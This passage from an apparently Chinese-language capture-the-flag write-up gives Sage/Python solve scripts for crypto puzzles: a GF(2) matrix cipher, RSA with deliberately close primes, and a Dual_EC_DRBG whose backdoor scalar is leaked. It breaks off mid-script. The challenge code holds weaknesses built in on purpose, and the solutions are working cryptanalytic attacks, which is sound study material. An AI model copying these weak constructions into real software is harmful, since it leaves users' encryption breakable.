<span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line">PP = zero_matrix(GF(<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    PP[k] = [<span class="number">1</span> <span class="keyword">if</span> x <span class="keyword">in</span> P[k] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">PPt = PP.transpose()</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;</span></span><br><span class="line">C = zero_matrix(GF(<span class="number">2</span>),<span class="number">8</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">32</span>):</span><br><span class="line">    C[k//<span class="number">32</span>] = [<span class="number">1</span> <span class="keyword">if</span> x == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> c[k:k+<span class="number">32</span>]]</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">f0 = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">b&#x27;flag&#x27;</span>.<span class="built_in">hex</span>(),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">4</span>*<span class="number">8</span>)))</span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">tmp = C[<span class="number">0</span>] - (f0*(PPt^<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    l = <span class="built_in">list</span>((C[k]-tmp)*PPt^(-<span class="number">6</span>))</span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l]),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="中学数学"><a href="#中学数学" class="headerlink" title="中学数学"></a>中学数学</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>Zuni: 听说密码学是小学数学来着？</p><p>// 随缘评：真的吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 接近，且前1024-500位相同，有 $\sqrt{n}&gt;&gt;500 \approx p&gt;&gt;500 \approx q-p$，故可爆破找差值 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">f1, f2</span>):</span><br><span class="line">g = f1.resultant(f2, q)</span><br><span class="line">roots = g.univariate_polynomial().roots()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">xh = x &gt;&gt; <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">1000000</span>,<span class="number">10000000</span>):</span><br><span class="line">    d = xh - k</span><br><span class="line">    P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = n - p*q</span><br><span class="line">    f2 = d - (q - p)</span><br><span class="line">    res = solve(f1, f2)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 5476332</span></span><br><span class="line"><span class="comment"># (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911)</span></span><br></pre></td></tr></table></figure><p>再常规解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="bd-key"><a href="#bd-key" class="headerlink" title="bd_key"></a>bd_key</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>master of pwn一下就解出了明文，因为有后门（本题与pwn无关）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> Note: I have modified Dual_EC a little bit.</span></span><br><span class="line"><span class="string">    It would be EASIER for you to exploit it.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dual_EC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, s_0=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># Init curve P-256</span></span><br><span class="line">        self.p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">        self.n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">        self.b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line">        self.curve = EllipticCurve(GF(self.p), [-<span class="number">3</span>, self.b])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init P, Q</span></span><br><span class="line">        self.Qx = <span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span></span><br><span class="line">        self.Qy = <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span></span><br><span class="line">        self.Q = self.curve(self.Qx, self.Qy)</span><br><span class="line">        self.d = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = self.d * self.Q      </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init state, h_adin</span></span><br><span class="line">        <span class="keyword">if</span> s_0 == <span class="literal">None</span>:</span><br><span class="line">            self.s_i = <span class="built_in">int</span>(floor((<span class="number">2</span>^<span class="number">16</span>-<span class="number">1</span>)*random()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.s_i = s_0</span><br><span class="line">        self.h_adin = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        self.__leak_par()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__leak_par</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;curve = <span class="subst">&#123;self.curve&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;self.P&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;self.d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;self.Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output 32bytes now.          </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__Dual_EC_DRBG</span>(<span class="params">self, h_adin = <span class="number">0</span></span>): </span><br><span class="line">        t_i = self.s_i ^^ h_adin</span><br><span class="line">        self.s_i = (t_i*self.P)[<span class="number">0</span>].lift()</span><br><span class="line">        r_i = (self.s_i*self.Q)[<span class="number">0</span>].lift()</span><br><span class="line">        <span class="keyword">return</span> r_i</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNBytes</span>(<span class="params">self, N:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        req = (N/<span class="number">32</span>).ceil()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(req):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG(self.h_adin)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG()</span><br><span class="line"></span><br><span class="line">        self.s_i = (self.s_i * self.P)[<span class="number">0</span>].lift()</span><br><span class="line"></span><br><span class="line">        result = result &gt;&gt; ((<span class="number">32</span>*req - N)*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(result)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">    <span class="keyword">from</span> FLAG3 <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag_pad = pad(flag, <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(flag_pad)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_schnorr_identification</span>(<span class="params">dbrg</span>):</span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    g = Zp(<span class="number">2</span>)</span><br><span class="line">    q = g.multiplicative_order()</span><br><span class="line">    Zq = Zmod(q)</span><br><span class="line">    k = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrProver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            self.secret_key = Zq.random_element()</span><br><span class="line">            self.public_key = g^self.secret_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">commit</span>(<span class="params">self</span>):</span><br><span class="line">            self.r = Zq.random_element()</span><br><span class="line">            <span class="keyword">return</span> g^self.r</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">respond</span>(<span class="params">self, challenge</span>):</span><br><span class="line">            <span class="keyword">return</span> self.r - challenge*self.secret_key</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrVerifier</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, prover_public_key</span>):</span><br><span class="line">            self.prover_public_key = prover_public_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">self, commitment</span>):</span><br><span class="line">            self.commitment = commitment</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                c = bytes_to_long(dbrg.getRandomNBytes(<span class="number">32</span>))</span><br><span class="line">                <span class="keyword">if</span> c &lt; p:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.challenge_number = c</span><br><span class="line">            <span class="keyword">return</span> self.challenge_number</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, response</span>):</span><br><span class="line">            check_value = g^response*self.prover_public_key^self.challenge_number</span><br><span class="line">            <span class="keyword">return</span> self.commitment == check_value</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_protocol</span>(<span class="params">iterations=<span class="number">1</span></span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(iterations):</span><br><span class="line">            prover = SchnorrProver()</span><br><span class="line">            verifier = SchnorrVerifier(prover.public_key)</span><br><span class="line">            t = prover.commit()</span><br><span class="line">            c = verifier.challenge(t)</span><br><span class="line">            s = prover.respond(c)</span><br><span class="line">            <span class="keyword">assert</span>(verifier.check(s))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    run_protocol()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dbrg = Dual_EC()</span><br><span class="line">    do_schnorr_identification(dbrg)</span><br><span class="line">    key = dbrg.getRandomNBytes(<span class="number">16</span>)</span><br><span class="line">    ct = encrypt_flag(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;bytes_to_long(ct)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951</span><br><span class="line"># P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)</span><br><span class="line"># d = 66604141534275704476445937214374130642068729921454877238730830814793201802544</span><br><span class="line"># Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)</span><br><span class="line"># c = 59100197418944667413449341413044666843726352095054393072750502893110293231642</span><br><span class="line"># ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><br></pre></td></tr></table></figure></blockquote><p>双椭圆曲线确定性随机数发生器（Dual_EC_DRBG）的一个后门，原理：</p><p>设每一步的 $\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。</p><p>对于攻击者来说，已知 $P$、$Q$、$d$、$r_{i-1}$，而 $s_i$ 未知。于是有：</p><p>$\begin{cases} ((s_i \cdot P)_x \cdot P)_x &amp; \rightarrow s_{i+1} \newline ((s_i \cdot P)_x \cdot Q)_x &amp; \rightarrow r_i \end{cases}$</p><p>后门为构造 $d \cdot r_{i-1}$，其恰好是 $s_i$，看似安全的体制被攻破。</p><p>记 $k_i = (s_i \cdot P)_x$，有：</p><p>$\begin{align} d \cdot r_{i-1} &amp; = {(d \cdot R_{i-1})_x = (d \cdot k_{i-1} \cdot Q)_x} = {(k_{i-1} \cdot d \cdot Q)_x = (k_{i-1} \cdot P)_x} = {((s_{i-1} \cdot P)_x \cdot P)_x = s_i} \end{align}$</p><p>题里 $c=r_{i-1}$，构造 $d \cdot c = s_i$，则可以推出下一个随机数 $r_i=((s_i \cdot P)_x \cdot Q)_x$，取高16*8位为AES的Key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">P = (<span class="number">72696788778535848020209987825324097844942627382508830211685965810687985426258</span>, <span class="number">49180397040468497821240854375656422791216946832858522054245540263375986110762</span>)</span><br><span class="line">d = 